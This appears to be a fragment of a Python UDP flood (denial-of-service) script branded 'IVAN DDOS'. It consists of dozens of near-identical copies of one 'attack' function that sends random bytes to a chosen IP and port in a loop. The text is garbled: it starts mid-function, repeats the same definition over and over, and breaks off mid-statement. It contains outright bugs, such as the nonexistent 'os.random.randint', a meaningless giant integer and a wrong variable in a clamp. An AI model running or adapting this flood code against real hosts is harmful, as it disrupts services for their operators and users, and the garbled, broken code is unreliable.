        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
